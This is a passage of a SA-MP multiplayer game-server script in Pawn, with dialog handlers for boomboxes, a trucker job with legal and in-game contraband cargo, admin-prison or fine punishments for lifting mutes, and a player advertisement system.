	if(dialogid == DIALOG_BOOMBOX_PLAY)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s has set down a Boombox to %s.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			BoomBoxSet[playerid] = 1;

        	GetPlayerPos(playerid, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]);
        	BoomboxInfo[playerid][bbInt] = GetPlayerInterior(playerid);
        	BoomboxInfo[playerid][bbVW] = GetPlayerVirtualWorld(playerid);
			BoomboxInfo[playerid][bbStation] = t+1;
			BoomboxInfo[playerid][bbSetBy] = playerid;

			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			BoomboxInfo[playerid][bbObject] = CreateDynamicObject(2103, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]-0.9, 0, 0, 0, BoomboxInfo[playerid][bbVW], BoomboxInfo[playerid][bbInt]);

       		foreach(Player, i)
			{
				if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[playerid][bbPosX],BoomboxInfo[playerid][bbPosY],BoomboxInfo[playerid][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[playerid][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[playerid][bbVW])
				{
					PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl], BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ], 50.0, 1);
				}
			}
		}
	}
	/*if(dialogid == REPORTSMENU)
	{
	    if(response)
	    {
	        if(CancelReport[playerid] == listitem) return 1;
			new reportid = ListItemReportId[playerid][listitem];
	        if(Reports[reportid][BeingUsed] == 0)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			    return 1;
			}
			if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
			{
			    SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			    Reports[reportid][ReportFrom] = 999;
			    Reports[reportid][BeingUsed] = 0;
			    return 1;
			}
			format(string, sizeof(string), "AdmCmd: %s has accepted the report from %s (ID: %i RID: %i).", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), Reports[reportid][ReportFrom], reportid);
			ABroadCast(COLOR_ORANGE, string, 1);
			AddReportToken(playerid); // Report Tokens
			if(PlayerInfo[playerid][pAdmin] == 1)
			{
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "An admin has accepted your report and is reviewing it, you can /reply to send messages to the admin reviewing your report.");
			}
			else
			{
			    format(string, sizeof(string), "%s has accepted your report and is reviewing it, you can /reply to send messages to the admin reviewing your report.", GetPlayerNameEx(playerid));
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
			}
			PlayerInfo[playerid][pAcceptReport]++;
			Reports[reportid][ReplyTimerr] = SetTimerEx("ReplyTimer", 60000, 0, "d", reportid);
			Reports[reportid][CheckingReport] = playerid;
			//Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			Reports[reportid][TimeToExpire] = 0;
			//strmid(Reports[reportid][Report], "None", 0, 4, 4);
	    }
	    else
	    {
	        if(CancelReport[playerid] == listitem) return 1;
	        new reportid = ListItemReportId[playerid][listitem];
	        if(Reports[reportid][BeingUsed] == 0)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   That report ID is not being used!");
			    return 1;
			}
			if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
			{
			    SendClientMessage(playerid, COLOR_GREY, "   The reporter has disconnected!");
			    Reports[reportid][ReportFrom] = 999;
			    Reports[reportid][BeingUsed] = 0;
			    return 1;
			}
			format(string, sizeof(string), "AdmCmd: %s has trashed the report from %s (RID: %i).", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
			ABroadCast(COLOR_ORANGE, string, 1);
			if(PlayerInfo[playerid][pAdmin] == 1)
			{
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "An admin has marked your report invalid. It will not be reviewed.");
			}
			else
			{
			    format(string, sizeof(string), "%s has marked your report invalid. It will not be reviewed.", GetPlayerNameEx(playerid));
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
			}
			PlayerInfo[playerid][pTrashReport]++;
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			Reports[reportid][TimeToExpire] = 0;
			new reportdialog[2048], itemid = 0;
		    for(new i = 0; i < MAX_REPORTS; i++)
			{
				if(Reports[i][BeingUsed] == 1 && itemid < 40)
				{
					ListItemReportId[playerid][itemid] = i;
					itemid++;
					if(strlen((Reports[i][Report])) > 92)
					{
						new firstline[128], secondline[128];
						strmid(firstline, Reports[i][Report], 0, 88);
						strmid(secondline, Reports[i][Report], 88, 128);
						format(reportdialog, sizeof(reportdialog), "%s%s(ID:%i) | Report: %s", reportdialog, GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, firstline);
						format(reportdialog, sizeof(reportdialog), "%s%s", reportdialog, secondline);
						ListItemReportId[playerid][itemid] = i;
						itemid++;
					}
					else format(reportdialog, sizeof(reportdialog), "%s%s(ID:%i) | Report: %s", reportdialog, GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, (Reports[i][Report]));

					format(reportdialog, sizeof(reportdialog), "%s\n", reportdialog);
				}
			}
			CancelReport[playerid] = itemid;
			format(reportdialog, sizeof(reportdialog), "%s\n", reportdialog);
			format(reportdialog, sizeof(reportdialog), "%sCancel Reports", reportdialog);
			//SendClientMessage(playerid, COLOR_GREEN, "___________________________________________________");
			ShowPlayerDialogEx(playerid, REPORTSMENU, DIALOG_STYLE_LIST, "Reports", reportdialog, "Accept", "Trash");
			//strmid(Reports[reportid][Report], "None", 0, 4, 4);
	    }
	}*/
	if(dialogid == DIALOG_LOADTRUCK) // TRUCKER JOB LOAD TRUCK
	{
 		if(response)
		{
			if(listitem == 0) // Legal goods
			{

			    ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKL, DIALOG_STYLE_LIST, "What do you want to transport?","{00F70C}Food & beverages\n{00F70C}Clothing\n{00F70C}Materials\n{00F70C}24/7 Items", "Select", "Cancel");
			}
			if(listitem == 1) // Illegal goods
			{
				new level = PlayerInfo[playerid][pTruckSkill];
				if(level >= 0 && level < 50)
				{
            		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "What do you want to transport?","{FF0606}Weapons 		{FFFFFF}(Level 1 Bonus: None)\n{FF0606}Drugs 			{FFFFFF}(Level 1 Bonus: None)\n{FF0606}Illegal materials  	{FFFFFF}(Level 1 Bonus: Free 25 materials)", "Select", "Cancel");
				}
				else if(level >= 50 && level < 100)
				{
		    		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "What do you want to transport?","{FF0606}Weapons 		{FFFFFF}(Level 2 Bonus: Silenced Pistol or 9mm)\n{FF0606}Drugs 			{FFFFFF}(Level 2 Bonus: 1 pot or 1 crack)\n{FF0606}Illegal materials  	{FFFFFF}(Level 2 Bonus: Free 50 materials)", "Select", "Cancel");
				}
				else if(level >= 100 && level < 200)
				{
		    		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "What do you want to transport?","{FF0606}Weapons 		{FFFFFF}(Level 3 Bonus: Silenced Pistol, 9mm or Shotgun)\n{FF0606}Drugs 			{FFFFFF}(Level 3 Bonus: 1 pot and 1 crack)\n{FF0606}Illegal materials  	{FFFFFF}(Level 3 Bonus: Free 100 materials)", "Select", "Cancel");
				}
				else if(level >= 200 && level < 400)
				{
            		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "What do you want to transport?","{FF0606}Weapons 		{FFFFFF}(Level 4 Bonus: Silenced Pistol, 9mm, Shotgun or Rifle)\n{FF0606}Drugs 			{FFFFFF}(Level 4 Bonus: 2g of pot and 2g of crack)\n{FF0606}Illegal materials  	{FFFFFF}(Level 4 Bonus: Free 150 materials)", "Select", "Cancel");
				}
				else if(level >= 400)
				{
 		 			ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "What do you want to transport?","{FF0606}Weapons 		{FFFFFF}(Level 5 Bonus: Shotgun, Rifle or Deagle [rare])\n{FF0606}Drugs 			{FFFFFF}(Level 5 Bonus: 3g of pot and 3g of crack)\n{FF0606}Illegal materials  	{FFFFFF}(Level 5 Bonus: Free 200 materials)", "Select", "Cancel");
				}
			}
		}
		else
		{
		    DeletePVar(playerid, "IsFrozen");
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You canceled the loading of the Truck, type /loadtruck to try again.");
		}
	}
	if(dialogid == DIALOG_LOADTRUCKL) // TRUCKER JOB LEGAL GOODS
	{
 		if(response)
		{
			if(listitem == 0) // Food & beverages
			{
				new route = Random(1, 4);
    			if(route == 1)
				{
    				SetPVarInt(playerid, "TruckDeliver", 1);
    			}
    			if(route == 2)
				{
    				SetPVarInt(playerid, "TruckDeliver", 2);
    			}
    			if(route == 3)
				{
    				SetPVarInt(playerid, "TruckDeliver", 3);
    			}
    			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with food & beverages....");
			}
			if(listitem == 1) // Clothing
			{
				new route = Random(1, 4);
    			if(route == 1)
				{
    				SetPVarInt(playerid, "TruckDeliver", 4);
    			}
    			if(route == 2)
				{
    				SetPVarInt(playerid, "TruckDeliver", 5);
    			}
    			if(route == 3)
				{
    				SetPVarInt(playerid, "TruckDeliver", 6);
    			}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with clothing....");
			}
			if(listitem == 2) // Materials
			{
				SetPVarInt(playerid, "TruckDeliver", 7);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with materials....");
			}
			if(listitem == 3) // 24/7 Items
			{
				new route = Random(1, 4);
    			if(route == 1)
				{
    				SetPVarInt(playerid, "TruckDeliver", 8);
    			}
    			if(route == 2)
				{
    				SetPVarInt(playerid, "TruckDeliver", 9);
    			}
    			if(route == 3)
				{
    				SetPVarInt(playerid, "TruckDeliver", 10);
    			}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with 24/7 items....");
			}

  			LoadTruckBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
			SetProgressBarValue(LoadTruckBar[playerid], 100.0);
			ShowProgressBarForPlayer(playerid, LoadTruckBar[playerid]);
			SetTimerEx("LoadTruck", 1000, 0, "d", playerid);
		}
		else
		{
		    DeletePVar(playerid, "IsFrozen");
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You canceled the loading of the Truck, type /loadtruck to try again.");
		}
	}

	if(dialogid == DIALOG_LOADTRUCKI) // TRUCKER JOB ILLEGAL GOODS
	{
 		if(response)
		{
		    new level = PlayerInfo[playerid][pTruckSkill];
			if(listitem == 0) // Weapons
			{
				if(level >= 0 && level < 50)
				{
                    SetPVarInt(playerid, "TruckDeliver", 11); // bonus weapons
				}
				else if(level >= 50 && level < 100)
				{
                    SetPVarInt(playerid, "TruckDeliver", 12); // bonus weapons
				}
				else if(level >= 100 && level < 200)
				{
                    SetPVarInt(playerid, "TruckDeliver", 13); // bonus weapons
				}
				else if(level >= 200 && level < 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 14); // bonus weapons
				}
				else if(level >= 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 15); // bonus weapons
				}
    			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with weapons....");
			}
			if(listitem == 1) // Drugs
			{
				if(level >= 0 && level < 50)
				{
                    SetPVarInt(playerid, "TruckDeliver", 16); // bonus drugs
				}
				else if(level >= 50 && level < 100)
				{
                    SetPVarInt(playerid, "TruckDeliver", 17); // bonus drugs
				}
				else if(level >= 100 && level < 200)
				{
                    SetPVarInt(playerid, "TruckDeliver", 18); // bonus drugs
				}
				else if(level >= 200 && level < 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 19); // bonus drugs
				}
				else if(level >= 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 20); // bonus drugs
				}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with drugs....");
			}
			if(listitem == 2) // Illegal materials
			{
				if(level >= 0 && level < 50)
				{
                    SetPVarInt(playerid, "TruckDeliver", 21); // Bonus: x materials
				}
				else if(level >= 50 && level < 100)
				{
                    SetPVarInt(playerid, "TruckDeliver", 22); // Bonus: x materials
				}
				else if(level >= 100 && level < 200)
				{
                    SetPVarInt(playerid, "TruckDeliver", 23); // Bonus: x materials
				}
				else if(level >= 200 && level < 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 24); // Bonus: x materials
				}
				else if(level >= 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 25); // Bonus: x materials
				}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Please wait a moment while the truck is being loaded with illegal materials....");
			}

  			LoadTruckBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
			SetProgressBarValue(LoadTruckBar[playerid], 100.0);
			ShowProgressBarForPlayer(playerid, LoadTruckBar[playerid]);
			SetTimerEx("LoadTruck", 1000, 0, "d", playerid);
		}
		else
		{
		    DeletePVar(playerid, "IsFrozen");
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You canceled the loading of the Truck, type /loadtruck to try again.");
		}
	}
	if(dialogid == NMUTE)
	{
	    if(response == 1)
	    {
	        switch(listitem)
	        {
	            case 0: // Jailtime
				{
				    if(PlayerInfo[playerid][pNMuteTotal] < 4)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pNMute] = 0;
				        ResetPlayerWeaponsEx(playerid);
						if(PlayerInfo[playerid][pJailed] != 0)
						{
						    PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pNMuteTotal]*15*60;
						}
						else
						{
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
				    else if(PlayerInfo[playerid][pNMuteTotal] >= 4 || PlayerInfo[playerid][pNMuteTotal] < 7)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pNMute] = 0;
						GameTextForPlayer(playerid, "~w~Welcome to ~n~~r~Admin Prison", 5000, 3);
						ResetPlayerWeaponsEx(playerid);
                        if(PlayerInfo[playerid][pJailed] != 0)
                        {
                            PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pNMuteTotal]*15*60;
                        }
                        else
                        {
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
					format(string,sizeof(string),"{AA3333}AdmWarning{FFFF00}: %s is serving %d Minutes in Prison for Newbie Unmute.",GetPlayerNameEx(playerid),PlayerInfo[playerid][pNMuteTotal]*15);
					ABroadCast(COLOR_YELLOW,string,1);
	            }
	            case 1: // Fine
	            {
	                new playername[MAX_PLAYER_NAME];
	                GetPlayerName(playerid, playername, sizeof(playername));

					new allmoney;
					if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
					{
						allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}
					else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
					{
						allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
					}
					else
					{
						allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}

				    new fine = 10*allmoney/100;
	                format(string,sizeof(string),"{AA3333}AdmWarning{FFFF00}: %s has paid a $%d fine for Newbie Chat Unmute.",GetPlayerNameEx(playerid),fine);
	                GivePlayerCash(playerid,-fine);
					ABroadCast(COLOR_YELLOW,string,1);
					PlayerInfo[playerid][pNMute] = 0;
	            }
	        }
	    }
		else
		{
		    format(string,sizeof(string),"{AA3333}AdmWarning{FFFF00}: %s has canceled punishment for Newbie Chat Unmute.",GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW,string,1);
		}
	}
	if(dialogid == ADMUTE)
	{
	    if(response == 1)
	    {
	        switch(listitem)
	        {
	            case 0: // Jailtime
				{
				    if(PlayerInfo[playerid][pADMuteTotal] < 4)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pADMute] = 0;
				        ResetPlayerWeaponsEx(playerid);
						if(PlayerInfo[playerid][pJailed] != 0)
						{
						    PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pADMuteTotal]*15*60;
						}
						else
						{
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
				    else if(PlayerInfo[playerid][pADMuteTotal] >= 4 || PlayerInfo[playerid][pADMuteTotal] < 7)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pADMute] = 0;
						GameTextForPlayer(playerid, "~w~Welcome to ~n~~r~Admin Prison", 5000, 3);
						ResetPlayerWeaponsEx(playerid);
						if(PlayerInfo[playerid][pJailed] != 0)
						{
						    PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pADMuteTotal]*15*60;
						}
						else
						{
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
					format(string,sizeof(string),"{AA3333}AdmWarning{FFFF00}: %s is serving %d Minutes in Jail/Prison for Advertisement Unmute.",GetPlayerNameEx(playerid),PlayerInfo[playerid][pADMuteTotal]*15);
					ABroadCast(COLOR_YELLOW,string,1);
	            }
	            case 1: // Fine
	            {
	                new playername[MAX_PLAYER_NAME];
	                GetPlayerName(playerid, playername, sizeof(playername));

					new allmoney;
					if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
					{
						allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}
					else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
					{
						allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
					}
					else
					{
						allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}

                    PlayerInfo[playerid][pADMute] = 0;
				    new fine = 10*allmoney/100;
	                format(string,sizeof(string),"{AA3333}AdmWarning{FFFF00}: %s has paid a $%d fine for Advertisement Unmute.",GetPlayerNameEx(playerid),fine);
	                GivePlayerCash(playerid,-fine);
					ABroadCast(COLOR_YELLOW,string,1);
	            }
	        }
	    }
	    else
	    {
	        format(string,sizeof(string),"{AA3333}AdmWarning{FFFF00}: %s has canceled punishment for Advertisement Unmute.",GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW,string,1);
	    }
	}
	switch(dialogid) {
		case DIALOG_ADMAIN: if(response) switch(listitem) {
			case 0: {

				new
					szDialog[2256],
					szBuffer[32],
					arrAdverts[MAX_PLAYERS] = INVALID_PLAYER_ID,
					iDialogCount,
					iCount,
					iBreak,
					iRand;

				for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;
				foreach(Player, i) if(!isnull(szAdvert[i])) arrAdverts[iCount++] = i;

				while(iDialogCount < 50 && iBreak < 5000) {
					iRand = random(iCount);
					if(arrAdverts[iRand] != INVALID_PLAYER_ID) {
						strcpy(szBuffer, szAdvert[arrAdverts[iRand]], sizeof(szBuffer));
						if(AdminDuty[playerid] == 0) format(szDialog, sizeof(szDialog), "%s%s... (%i)\r\n", szDialog, szBuffer, PlayerInfo[arrAdverts[iRand]][pNumber]);
						else format(szDialog, sizeof(szDialog), "%s%s... (%s)\r\n", szDialog, szBuffer, GetPlayerNameEx(arrAdverts[iRand]));
						ListItemTrackId[playerid][iDialogCount++] = arrAdverts[iRand];
						arrAdverts[iRand] = INVALID_PLAYER_ID;
					}
					++iBreak;
				}
				if(!isnull(szDialog)) return ShowPlayerDialogEx(playerid, DIALOG_ADLIST, DIALOG_STYLE_LIST, "Advertisements - List", szDialog, "Select", "Return");
				ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
				SendClientMessage(playerid, COLOR_GREY, "No advertisements have been posted.");
			}
			case 1: ShowPlayerDialogEx(playerid, DIALOG_ADSEARCH, DIALOG_STYLE_INPUT, "Advertisements - Search", "Enter a search phrase.", "Search", "Return");
			case 2: {
				if(PlayerInfo[playerid][pADMute] == 1) {
					SendClientMessage(playerid, COLOR_GREY, "You're muted from advertisements.");
				}
				else if(PlayerInfo[playerid][pNumber] == 0) {
					SendClientMessage(playerid, COLOR_GRAD2, "You don't have a cell phone.");
				}
				else ShowPlayerDialogEx(playerid, DIALOG_ADPLACE, DIALOG_STYLE_INPUT, "Advertisements - Place Advertisement", "Enter your desired advertisement text! Keep it below 128 characters.", "Submit", "Return");
			}
			case 3: {
				if(PlayerInfo[playerid][pADMute] == 1) {
					SendClientMessage(playerid, COLOR_GREY, "You're muted from advertisements.");
				}
				else if(PlayerInfo[playerid][pNumber] == 0) {
					SendClientMessage(playerid, COLOR_GRAD2, "You don't have a cell phone.");
				}
				else if(iAdverTimer >= 1) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
					return SendClientMessage(playerid, COLOR_GREY, "Only one priority advertisement can be placed every 30 seconds.");
				}
				else if(GetPVarType(playerid, "adT")) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
					return SendClientMessage(playerid, COLOR_GREY, "You may only place one priority advertisement every two minutes.");
				}
				else ShowPlayerDialogEx(playerid, DIALOG_ADPLACEP, DIALOG_STYLE_INPUT, "Advertisements - Priority Advertisement",
				"Enter your desired advertisement text! Keep it below 128 characters.\nAs this is a priority advertisement, it will be broadcasted, and will cost you $800.", "Submit", "Return");
			}
		}
		case DIALOG_ADPLACE: {
			if(response) {

				new
					iLength = strlen(inputtext);

				if(!(2 <= iLength <= 127)) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
					return SendClientMessage(playerid, COLOR_GREY, "Your input was too long or too short.");
				}

				iLength *= 5;
				if(GetPlayerCash(playerid) < iLength) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
					return SendClientMessage(playerid, COLOR_GREY, "You don't have enough cash for this.");
				}
				strcpy(szAdvert[playerid], inputtext, 128);
				GivePlayerCash(playerid, -iLength);
				format(string, sizeof(string), "Congratulations, you have placed your advertisement for $%d!", iLength);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
		}

		case DIALOG_ADPLACEP: {
			if(response) {
				if(iAdverTimer >= 1) {
					SendClientMessage(playerid, COLOR_GREY, "Only one priority advertisement can be placed every 30 seconds.");
					return ShowPlayerDialogEx(playerid, DIALOG_ADPLACEP, DIALOG_STYLE_INPUT, "Advertisements - Priority Advertisement",
					"Enter your desired advertisement text! Keep it below 128 characters.\nAs this is a priority advertisement, it will be broadcasted, and will cost you $800.", "Submit", "Return");
				}
				else if(GetPlayerCash(playerid) < 800) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
					return SendClientMessage(playerid, COLOR_GREY, "You don't have enough cash for this.");
				}
				else if(!(2 <= strlen(inputtext) <= 79)) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Advertisements", "List Advertisements\nSearch Advertisements\nPlace Advertisement\nPlace Priority Advertisement", "Select", "Cancel");
					return SendClientMessage(playerid, COLOR_GREY, "Your input was too long or too short.");
				}
				iAdverTimer = 30;
				SetPVarInt(playerid, "adT", 120);
				strcpy(szAdvert[playerid], inputtext, 128);
				GivePlayerCash(playerid, -800);

				new
					szMessage[128];

